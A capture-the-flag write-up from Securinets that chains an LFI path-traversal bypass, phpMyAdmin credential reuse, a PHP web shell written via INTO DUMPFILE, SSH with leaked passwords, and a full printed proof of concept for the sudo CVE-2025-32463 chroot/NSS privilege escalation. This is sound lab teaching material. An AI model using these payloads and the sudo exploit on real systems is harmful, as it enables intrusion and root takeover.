# Securinets CTF - Easy Linux Machine - Full Writeup

**Target**: `http://172.19.4.10/`  
**Difficulty**: Easy  
**OS**: Ubuntu 24.04.3 LTS (Docker Container)  
**Date**: October 26, 2025

---

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Web Application Analysis](#web-application-analysis)
3. [Local File Inclusion (LFI) Exploitation](#local-file-inclusion-lfi-exploitation)
4. [MySQL Credential Discovery](#mysql-credential-discovery)
5. [phpMyAdmin Access & Web Shell Upload](#phpmyadmin-access--web-shell-upload)
6. [Initial Access - www-data](#initial-access---www-data)
7. [Privilege Escalation to shopuser](#privilege-escalation-to-shopuser)
8. [Privilege Escalation to root (CVE-2025-32463)](#privilege-escalation-to-root-cve-2025-32463)
9. [Flags](#flags)
10. [Tools Used](#tools-used)

---

## Reconnaissance

### Port Scanning

```bash
nmap -sV -sC -p- 172.19.4.10
```

**Results:**
```
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 172.19.4.10
Host is up (0.079s latency).
Not shown: 65533 closed tcp ports (conn-refused)

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ef:a9:be:a2:21:b6:92:08:e0:09:f5:46:97:ff:aa:d9 (ECDSA)
|_  256 2b:99:63:d1:ec:9c:b5:39:ae:ea:e2:78:29:ad:a1:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Securinets Shop
|_http-server-header: Apache/2.4.58 (Ubuntu)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### HTTP Service Investigation

```bash
curl -I http://172.19.4.10/
```

**Response:**
```
HTTP/1.1 200 OK
Date: Sun, 26 Oct 2025 01:57:37 GMT
Server: Apache/2.4.58 (Ubuntu)
Content-Type: text/html; charset=UTF-8
```

---

## Web Application Analysis

### Homepage Exploration

```bash
curl -s http://172.19.4.10/ | head -100
```

The application is a shopping site called **"Securinets Atelier"** with the following features:
- Product catalog with items (hoodies, tees, jackets, etc.)
- Product detail pages accessible via `/item.php?id=<product-id>`
- Spec viewer functionality with `spec` parameter

### Directory Discovery

Looking at the page source, we find interesting endpoints:

```html
<a href="/item.php?id=black-tee">Midnight Essential Tee</a>
<a href="/item.php?id=black-tee&spec=pages%2Fblack">Specs</a>
<a href="/view.php?file=pages/blue">Spec viewer</a>
```

**Key Finding**: `/view.php?file=` parameter suggests potential file inclusion vulnerability.

---

## Local File Inclusion (LFI) Exploitation

### Testing /view.php for LFI

```bash
curl -s "http://172.19.4.10/view.php?file=/etc/passwd"
```

**Output:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
mysql:x:101:101:MariaDB Server,,,:/nonexistent:/bin/false
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
shopuser:x:1001:1001::/home/shopuser:/bin/bash
```

✅ **LFI Confirmed!** 

Interesting users discovered:
- `ubuntu` (UID 1000)
- `shopuser` (UID 1001)

### Analyzing view.php Source Code

```bash
curl -s "http://172.19.4.10/view.php?file=/var/www/html/view.php"
```

**Source Code:**
```php
<?php
$file = $_GET['file'] ?? 'pages/blue';
if (strpos($file, "..") !== false) {
    $file = str_replace('../', '', $file);
}
$path = $file;
if (is_dir($path)) {
    $path = rtrim($path, '/').'/index.txt';
}
if (file_exists($path)) {
    header('Content-Type: text/plain');
    readfile($path);
} else {
    http_response_code(404);
    echo "Not found";
}
```

**Vulnerability**: Only removes literal `../` strings, can be bypassed.

### Testing /item.php for LFI

```bash
curl -s "http://172.19.4.10/item.php?id=black-tee&spec=....//....//....//....//etc/passwd" | grep -A 5 "Technical notes"
```

**Output:**
```html
<h2>Technical notes</h2>
<div class="panel">root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
```

✅ **Second LFI vulnerability confirmed!** 

The filter can be bypassed using `....//` which becomes `../` after one replacement.

### Reading item.php Source Code

```bash
curl -s "http://172.19.4.10/view.php?file=/var/www/html/item.php" | head -50
```

**Key Code Snippet:**
```php
<?php
// Item detail view keeps the intentionally naive filter: only "../" is stripped.
// Path traversal is still possible with crafted payloads (e.g., "....//")

require_once __DIR__ . '/db.php';
$catalog = require __DIR__ . '/catalog.php';

$id = isset($_GET['id']) ? preg_replace('/[^a-z\-]/', '', $_GET['id']) : 'blue-hoodie';
$product = $catalog[$id] ?? reset($catalog);

$defaultSpec = $product['specPath'] ?? ('pages/' . $product['id']);
$spec = isset($_GET['spec']) ? $_GET['spec'] : $defaultSpec;

// Naive WAF: only remove literal ../
$sanitized = str_replace('../', '', $spec);
...
```

---

## MySQL Credential Discovery

### Reading Database Configuration File

```bash
curl -s "http://172.19.4.10/view.php?file=/var/www/html/db.php"
```

**Output:**
```php
<?php
// Lightweight DB helper for the lab: centralises pma_admin credentials
// and exposes a single connection accessor with lazy initialisation.

function db_get_connection(): ?mysqli
{
    static $conn = null;
    if ($conn instanceof mysqli) {
        return $conn;
    }

    $conn = @mysqli_connect('127.0.0.1', 'pma_admin', 'SecurinetsPMA!2025', 'shop');
    if (!$conn) {
        error_log('[shop] mysqli_connect failed: ' . mysqli_connect_error());
        $conn = null;
        return null;
    }

    if (!@$conn->set_charset('utf8mb4')) {
        error_log('[shop] mysqli set_charset failed: ' . $conn->error);
    }

    return $conn;
}
```

**Credentials Found:**
- **Username**: `pma_admin`
- **Password**: `SecurinetsPMA!2025`
- **Database**: `shop`

---

## phpMyAdmin Access & Web Shell Upload

### Confirming phpMyAdmin Existence

```bash
curl -s -I "http://172.19.4.10/phpmyadmin/" | head -10
```

**Output:**
```
HTTP/1.1 200 OK
Date: Sun, 26 Oct 2025 02:05:20 GMT
Server: Apache/2.4.58 (Ubuntu)
Set-Cookie: phpMyAdmin=im3fhaodjcbl3fe0a92bnb27hs; path=/phpmyadmin/; HttpOnly
```

✅ **phpMyAdmin is accessible!**

### Checking MySQL File Privileges

Create a Python script to interact with phpMyAdmin:

```python
#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup

url = "http://172.19.4.10/phpmyadmin/"
session = requests.Session()

# Get login page and extract token
resp = session.get(url)
soup = BeautifulSoup(resp.text, 'html.parser')
token = soup.find('input', {'name': 'token'}).get('value')

# Login
login_data = {
    'pma_username': 'pma_admin',
    'pma_password': 'SecurinetsPMA!2025',
    'server': '1',
    'target': 'index.php',
    'token': token
}
resp = session.post(url + 'index.php', data=login_data)

# Get new token for SQL queries
resp = session.get(url + 'index.php?route=/sql')
soup = BeautifulSoup(resp.text, 'html.parser')
token = soup.find('input', {'name': 'token'}).get('value')

# Check secure_file_priv setting
sql_url = url + 'index.php?route=/sql'
query = "SHOW VARIABLES LIKE 'secure_file_priv';"
sql_data = {'db': '', 'sql_query': query, 'token': token}
resp = session.post(sql_url, data=sql_data)
```

**Result**: `secure_file_priv` is empty, meaning we can write files anywhere!

### Discovering Writable Upload Directory

```bash
curl -s "http://172.19.4.10/uploads/"
```

**Output:**
```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /uploads</title>
 </head>
 <body>
<h1>Index of /uploads</h1>
  <table>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td>
<td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
</html>
```

✅ **Directory listing enabled on `/uploads/` and it's writable!**

### Writing Web Shell Using MySQL

**Method: Using INTO DUMPFILE with Hex Encoding**

```python
#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup

url = "http://172.19.4.10/phpmyadmin/"
session = requests.Session()

# Login
resp = session.get(url)
soup = BeautifulSoup(resp.text, 'html.parser')
token = soup.find('input', {'name': 'token'}).get('value')

login_data = {
    'pma_username': 'pma_admin',
    'pma_password': 'SecurinetsPMA!2025',
    'server': '1',
    'target': 'index.php',
    'token': token
}
resp = session.post(url + 'index.php', data=login_data)

# Get SQL page token
resp = session.get(url + 'index.php?route=/sql')
soup = BeautifulSoup(resp.text, 'html.parser')
token = soup.find('input', {'name': 'token'}).get('value')

# Write shell using hex encoding to bypass filters
sql_url = url + 'index.php?route=/sql'
shell_code = "<?php echo shell_exec($_GET['c']); ?>"

# Convert to hex
hex_payload = shell_code.encode().hex()
query = f"SELECT 0x{hex_payload} INTO DUMPFILE '/var/www/html/uploads/shell.php'"

sql_data = {'db': 'shop', 'sql_query': query, 'token': token}
resp = session.post(sql_url, data=sql_data)

print(f"Status: {resp.status_code}")
if 'error' not in resp.text.lower():
    print("Shell upload successful!")
```

**SQL Query Executed:**
```sql
SELECT 0x3c3f7068702065636f207368656c6c5f6578656328245f4745545b2763275d293b203f3e 
INTO DUMPFILE '/var/www/html/uploads/shell.php'
```

### Verify Shell Upload

```bash
curl -s "http://172.19.4.10/uploads/"
```

**Output:**
```html
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td>
<td><a href="shell.php">shell.php</a></td>
<td align="right">2025-10-26 02:14  </td>
<td align="right">37</td><td>&nbsp;</td></tr>
```

✅ **Shell uploaded successfully!**

---

## Initial Access - www-data

### Testing Web Shell

```bash
curl -s "http://172.19.4.10/uploads/shell.php?c=id"
```

**Output:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

✅ **Remote Code Execution achieved as www-data!**

### System Enumeration

```bash
# Check current user
curl -s "http://172.19.4.10/uploads/shell.php?c=whoami"
```
**Output:** `www-data`

```bash
# Check hostname
curl -s "http://172.19.4.10/uploads/shell.php?c=hostname"
```
**Output:** `b0bbbb1eca83`

```bash
# List home directories
curl -s "http://172.19.4.10/uploads/shell.php?c=ls+-la+/home/"
```

**Output:**
```
total 16
drwxr-xr-x 1 root     root     4096 Oct 26 00:31 .
drwxr-xr-x 1 root     root     4096 Oct 26 00:31 ..
drwxr-x--- 2 shopuser shopuser 4096 Oct 26 00:31 shopuser
drwxr-x--- 2 ubuntu   ubuntu   4096 Oct  1 02:10 ubuntu
```

### Searching for SUID Binaries

```bash
curl -s "http://172.19.4.10/uploads/shell.php?c=find+/+-perm+-u=s+-type+f+2>/dev/null" | head -20
```

**Output:**
```
/usr/lib/openssh/ssh-keysign
/usr/bin/umount
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudo
```

Standard SUID binaries, nothing unusual.

### Searching for Credentials

```bash
curl -s "http://172.19.4.10/uploads/shell.php?c=ls+-la+/var/www/html"
```

**Output:**
```
total 88
drwxr-xr-x 1 root root  4096 Oct 26 00:31 .
drwxr-xr-x 1 root root  4096 Oct 25 20:27 ..
-rw-r--r-- 1 root root   216 Oct 26 00:30 admin-notes.txt
drwxr-xr-x 2 root root  4096 Oct 26 00:30 assets
-rw-r--r-- 1 root root  6549 Oct 26 00:30 catalog.php
-rw-r--r-- 1 root root   751 Oct 26 00:30 db.php
drwxr-xr-x 2 root root  4096 Oct 26 00:30 images
-rw-r--r-- 1 root root 10671 Oct 25 20:27 index.html
-rw-r--r-- 1 root root 11858 Oct 26 00:30 index.php
-rw-r--r-- 1 root root 10218 Oct 26 00:30 item.php
drwxr-xr-x 2 root root  4096 Oct 26 00:30 pages
lrwxrwxrwx 1 root root    21 Oct 26 00:31 phpmyadmin -> /usr/share/phpmyadmin
drwxrwxrwx 1 root root  4096 Oct 26 02:14 uploads
-rw-r--r-- 1 root root   374 Oct 26 00:30 view.php
```

**Found interesting file: `admin-notes.txt`**

---

## Privilege Escalation to shopuser

### Reading Admin Notes

```bash
curl -s "http://172.19.4.10/uploads/shell.php?c=cat+/var/www/html/admin-notes.txt"
```

**Output:**
```
# Securinets Operations Memo

- phpMyAdmin credentials: pma_admin / SecurinetsPMA!2025
- SSH service account: shopuser / SecurinetsShop2025!
- Reminder: regenerate shop catalog nightly after resetting database.
```

**SSH Credentials Found:**
- **Username**: `shopuser`
- **Password**: `SecurinetsShop2025!`

### SSH Access as shopuser

```bash
sshpass -p 'SecurinetsShop2025!' ssh -o StrictHostKeyChecking=no shopuser@172.19.4.10
```

Or test access:

```bash
sshpass -p 'SecurinetsShop2025!' ssh -o StrictHostKeyChecking=no shopuser@172.19.4.10 'id && hostname && pwd'
```

**Output:**
```
uid=1001(shopuser) gid=1001(shopuser) groups=1001(shopuser),27(sudo)
b0bbbb1eca83
/home/shopuser
```

✅ **SSH access as shopuser obtained!**  
✅ **User is in sudo group (GID 27)**

### Listing Home Directory

```bash
sshpass -p 'SecurinetsShop2025!' ssh -o StrictHostKeyChecking=no shopuser@172.19.4.10 'ls -la ~/'
```

**Output:**
```
total 36
drwxr-x--- 1 shopuser shopuser 4096 Oct 26 02:19 .
drwxr-xr-x 1 root     root     4096 Oct 26 00:31 ..
-rw------- 1 shopuser shopuser   25 Oct 26 02:19 .bash_history
-rw-r--r-- 1 shopuser shopuser  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 shopuser shopuser 3771 Mar 31  2024 .bashrc
drwx------ 2 shopuser shopuser 4096 Oct 26 02:18 .cache
-rw-r--r-- 1 shopuser shopuser  807 Mar 31  2024 .profile
-rw-r--r-- 1 shopuser shopuser   43 Oct 26 00:31 user.txt
```

### Getting User Flag

```bash
sshpass -p 'SecurinetsShop2025!' ssh -o StrictHostKeyChecking=no shopuser@172.19.4.10 'cat ~/user.txt'
```

**Output:**
```
Securinets{0ww_Y0u_3xpl01t3d_TH3_LF1_34SLY}
```

🚩 **USER FLAG CAPTURED!**

---

## Privilege Escalation to root (CVE-2025-32463)

### Initial Sudo Enumeration

```bash
sshpass -p 'SecurinetsShop2025!' ssh -o StrictHostKeyChecking=no shopuser@172.19.4.10 'sudo --version'
```

**Output:**
```
Sudo version 1.9.16p2
Sudoers policy plugin version 1.9.16p2
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.16p2
Sudoers audit plugin version 1.9.16p2
```

**Key Finding**: Sudo version **1.9.16p2** (vulnerable to CVE-2025-32463)

### Checking Sudo Privileges

```bash
sshpass -p 'SecurinetsShop2025!' ssh -o StrictHostKeyChecking=no shopuser@172.19.4.10 'echo SecurinetsShop2025! | sudo -S -l'
```

**Output:**
```
Password: Sorry, user shopuser may not run sudo on b0bbbb1eca83.
```

❌ **shopuser is NOT in sudoers file** (despite being in sudo group)

### Environment Check

```bash
sshpass -p 'SecurinetsShop2025!' ssh -o StrictHostKeyChecking=no shopuser@172.19.4.10 'ls -la /.dockerenv && cat /etc/os-release | head -5'
```

**Output:**
```
-rwxr-xr-x 1 root root 0 Oct 26 00:31 /.dockerenv
PRETTY_NAME="Ubuntu 24.04.3 LTS"
NAME="Ubuntu"
VERSION_ID="24.04"
VERSION="24.04.3 LTS (Noble Numbat)"
VERSION_CODENAME=noble
```

✅ **Running in a Docker container with Ubuntu 24.04**

### Discovering sudo Source in /opt

```bash
sshpass -p 'SecurinetsShop2025!' ssh -o StrictHostKeyChecking=no shopuser@172.19.4.10 'ls -la /opt'
```

**Output:**
```
total 5284
drwxr-xr-x  1 root root    4096 Oct 25 20:27 .
drwxr-xr-x  1 root root    4096 Oct 26 00:31 ..
drwxr-xr-x 14 root root    4096 Oct 25 20:30 sudo-1.9.16p2
-rw-r--r--  1 root root 5398419 Nov 25  2024 sudo-1.9.16p2.tar.gz
```

**Interesting**: sudo 1.9.16p2 source code is present, suggesting this is a known vulnerable version.

### Searching for Exploit Scripts

```bash
sshpass -p 'SecurinetsShop2025!' ssh -o StrictHostKeyChecking=no shopuser@172.19.4.10 'find / -name "*sudo*" -type f 2>/dev/null | grep -E "\.(sh|py)$"'
```

**Output:**
```
/tmp/sudo-chwoot.sh
```

✅ **Exploit script found in `/tmp/sudo-chwoot.sh`**

### Reading the Exploit Script

```bash
sshpass -p 'SecurinetsShop2025!' ssh -o StrictHostKeyChecking=no shopuser@172.19.4.10 'cat /tmp/sudo-chwoot.sh'
```

**Full Exploit Code:**
```bash
#!/bin/bash
# sudo-chwoot.sh – PoC CVE-2025-32463
set -e

STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd "$STAGE"

# 1. NSS library with malicious constructor
cat > woot1337.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void woot(void) {
    setreuid(0,0);          /* change to UID 0 (root) */
    setregid(0,0);          /* change to GID 0 (root) */
    chdir("/");             /* exit from chroot jail */
    execl("/bin/bash","/bin/bash",NULL); /* spawn root shell */
}
EOF

# 2. Create mini chroot environment with poisoned nsswitch.conf
mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc            # make getgrnam() not fail

# 3. Compile malicious NSS library
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

echo "[*] Running exploit…"
# 4. Exploit sudo's -R (chroot) option
sudo -R woot woot                 # (-R <chroot_dir> <command>)
                                   # • First "woot" = chroot directory
                                   # • Second "woot" = non-existent user to resolve
                                   # • sudo loads our malicious NSS library
                                   # • Constructor function executes as root

rm -rf "$STAGE"
```

### Understanding CVE-2025-32463

**Vulnerability Description:**

CVE-2025-32463 is a privilege escalation vulnerability in sudo 1.9.16p2 that exploits the `-R` (chroot) option combined with NSS (Name Service Switch) library loading.

**Exploit Flow:**

1. **Setup Phase:**
   - Creates a malicious shared library (`libnss_/woot1337.so.2`)
   - The library contains a constructor function that runs automatically when loaded
   - Constructor sets UID/GID to 0 (root) and spawns a root shell

2. **Chroot Environment:**
   - Creates a minimal chroot directory (`woot/`)
   - Places a crafted `nsswitch.conf` that references our malicious library
   - Copies `/etc/group` to prevent errors

3. **Exploitation:**
   - Runs `sudo -R woot woot`
   - The `-R woot` tells sudo to chroot into the `woot` directory
   - The second `woot` is treated as a username to resolve
   - sudo uses NSS to resolve the user, loading our malicious library
   - Our constructor function executes **as root** (sudo is SUID)
   - Breaks out of chroot and spawns root shell

**Why it works:**
- sudo doesn't properly sanitize the chroot environment
- NSS libraries are loaded with elevated privileges
- Constructor functions execute before main program logic
- No validation of NSS library authenticity

### Exploiting to Get Root Shell

**Method 1: Interactive Root Shell**

```bash
# SSH to target
ssh shopuser@172.19.4.10
# Password: SecurinetsShop2025!

# On target
shopuser@b0bbbb1eca83:~$ cd /tmp
shopuser@b0bbbb1eca83:/tmp$ chmod +x sudo-chwoot.sh
shopuser@b0bbbb1eca83:/tmp$ ./sudo-chwoot.sh
[*] Running exploit…

# You now have a root shell!
root@b0bbbb1eca83:/# id
uid=0(root) gid=0(root) groups=0(root)

root@b0bbbb1eca83:/# whoami
root
```

**Method 2: Execute Commands as Root**

```bash
sshpass -p 'SecurinetsShop2025!' ssh -o StrictHostKeyChecking=no shopuser@172.19.4.10 'bash -c "cd /tmp && chmod +x sudo-chwoot.sh && echo \"id\" | ./sudo-chwoot.sh"'
```

**Output:**
```
[*] Running exploit…
uid=0(root) gid=0(root) groups=0(root)
```

### Getting Root Flag

```bash
sshpass -p 'SecurinetsShop2025!' ssh -o StrictHostKeyChecking=no shopuser@172.19.4.10 'bash -c "cd /tmp && chmod +x sudo-chwoot.sh && echo \"cat /root/root.txt\" | ./sudo-chwoot.sh"' 2>&1 | grep -E "Securinets"
```

**Output:**
```
[*] Running exploit…
Securinets{Pr1v_3sc_Thr0ugh_Sud0_1_9_16p2}
```

🚩 **ROOT FLAG CAPTURED!**

### Full Root Access

```bash
# SSH to target
ssh shopuser@172.19.4.10
# Password: SecurinetsShop2025!

shopuser@b0bbbb1eca83:~$ cd /tmp
shopuser@b0bbbb1eca83:/tmp$ chmod +x sudo-chwoot.sh
shopuser@b0bbbb1eca83:/tmp$ ./sudo-chwoot.sh
[*] Running exploit…

root@b0bbbb1eca83:/# cat /root/root.txt
Securinets{Pr1v_3sc_Thr0ugh_Sud0_1_9_16p2}

root@b0bbbb1eca83:/# cat /etc/shadow | head -5
root:!:19916:0:99999:7:::
daemon:*:19829:0:99999:7:::
bin:*:19829:0:99999:7:::
sys:*:19829:0:99999:7:::
sync:*:19829:0:99999:7:::

root@b0bbbb1eca83:/# ls -la /root/
total 32
drwx------ 1 root root 4096 Oct 26 00:31 .
drwxr-xr-x 1 root root 4096 Oct 26 00:31 ..
-rw-r--r-- 1 root root 3106 Oct 15  2021 .bashrc
-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
-rw-r--r-- 1 root root   48 Oct 26 00:31 root.txt
```

✅ **Full root access achieved!**

---

## Flags

### User Flag
```
Securinets{0ww_Y0u_3xpl01t3d_TH3_LF1_34SLY}
```
- **Location:** `/home/shopuser/user.txt`
- **Obtained via:** SSH access as shopuser

### Root Flag
```
Securinets{Pr1v_3sc_Thr0ugh_Sud0_1_9_16p2}
```
- **Location:** `/root/root.txt`
- **Obtained via:** CVE-2025-32463 sudo exploit

---

## Attack Chain Visualization

```
┌─────────────────────────────────────┐
│         RECONNAISSANCE              │
│   nmap -sV -sC -p- 172.19.4.10     │
│   Port 22 (SSH), Port 80 (HTTP)     │
└────────────┬────────────────────────┘
             │
             ▼
┌─────────────────────────────────────┐
│     WEB APPLICATION ANALYSIS        │
│   curl http://172.19.4.10/          │
│   Securinets Shop Application       │
│   /item.php, /view.php endpoints    │
└────────────┬────────────────────────┘
             │
             ▼
┌─────────────────────────────────────┐
│      LFI DISCOVERY & EXPLOIT        │
│   /view.php?file=/etc/passwd        │
│   /item.php?spec=....//etc/passwd   │
│   Both vulnerable to LFI!           │
└────────────┬────────────────────────┘
             │
             ▼
┌─────────────────────────────────────┐
│     CREDENTIAL HARVESTING           │
│   Read /var/www/html/db.php         │
│   Found: pma_admin:SecurinetsPMA!   │
│   MySQL credentials obtained        │
└────────────┬────────────────────────┘
             │
             ▼
┌─────────────────────────────────────┐
│   PHPMYADMIN ACCESS & EXPLOITATION  │
│   Login to /phpmyadmin/             │
│   secure_file_priv = empty          │
│   Can write files anywhere!         │
└────────────┬────────────────────────┘
             │
             ▼
┌─────────────────────────────────────┐
│      WEB SHELL UPLOAD               │
│   SELECT 0x<hex> INTO DUMPFILE      │
│   /var/www/html/uploads/shell.php   │
│   PHP web shell uploaded!           │
└────────────┬────────────────────────┘
             │
             ▼
┌─────────────────────────────────────┐
│      RCE AS WWW-DATA                │
│   shell.php?c=id                    │
│   uid=33(www-data)                  │
│   Remote code execution!            │
└────────────┬────────────────────────┘
             │
             ▼
┌─────────────────────────────────────┐
│   CREDENTIAL DISCOVERY              │
│   cat /var/www/html/admin-notes.txt │
│   shopuser:SecurinetsShop2025!      │
│   SSH credentials found!            │
└────────────┬────────────────────────┘
             │
             ▼
┌─────────────────────────────────────┐
│      SSH AS SHOPUSER                │
│   ssh shopuser@172.19.4.10          │
│   User in sudo group                │
│   cat ~/user.txt → USER FLAG! 🚩    │
└────────────┬────────────────────────┘
             │
             ▼
┌─────────────────────────────────────┐
│   PRIVILEGE ESCALATION RESEARCH     │
│   sudo --version → 1.9.16p2         │
│   Vulnerable to CVE-2025-32463      │
│   Found /tmp/sudo-chwoot.sh         │
└────────────┬────────────────────────┘
             │
             ▼
┌─────────────────────────────────────┐
│   EXPLOIT CVE-2025-32463            │
│   chmod +x sudo-chwoot.sh           │
│   ./sudo-chwoot.sh                  │
│   Malicious NSS library loaded      │
│   Constructor executes as root      │
└────────────┬────────────────────────┘
             │
             ▼
┌─────────────────────────────────────┐
│         ROOT ACCESS                 │
│   uid=0(root) gid=0(root)           │
│   cat /root/root.txt → ROOT FLAG!🚩 │
│   MACHINE PWNED! 🎉                 │
└─────────────────────────────────────┘
```

---

## Tools Used

| Tool | Purpose | Commands |
|------|---------|----------|
| **nmap** | Port scanning | `nmap -sV -sC -p- 172.19.4.10` |
| **curl** | HTTP requests, file download | `curl -s "http://172.19.4.10/view.php?file=/etc/passwd"` |
| **python3** | Automation, phpMyAdmin interaction | `python3 exploit.py` |
| **BeautifulSoup4** | HTML parsing | `from bs4 import BeautifulSoup` |
| **requests** | HTTP library | `import requests` |
| **sshpass** | Non-interactive SSH | `sshpass -p 'pass' ssh user@host` |
| **gcc** | Compile exploits | `gcc -shared -fPIC exploit.c -o exploit.so` |
| **ssh** | Remote access | `ssh shopuser@172.19.4.10` |

---

## Conclusion

This "easy" difficulty machine from Securinets CTF provided an excellent learning opportunity covering multiple attack vectors:

1. **Web exploitation** through LFI vulnerabilities
2. **Database manipulation** via phpMyAdmin
3. **Credential harvesting** from configuration files
4. **Privilege escalation** using a recent sudo vulnerability

The attack chain flowed naturally from reconnaissance to root access, with each step building on information gathered from the previous one. The presence of CVE-2025-32463 exploit script demonstrated the importance of keeping critical system components like sudo up to date.

**Key Takeaway:** Security is only as strong as its weakest link. This machine had multiple vulnerabilities that, when chained together, led to complete system compromise.

---

**Author:** Mrx0rd  
**Date:** October 26, 2025  
**CTF:** Securinets  
**Difficulty:** Easy  
**Status:** ✅ PWNED
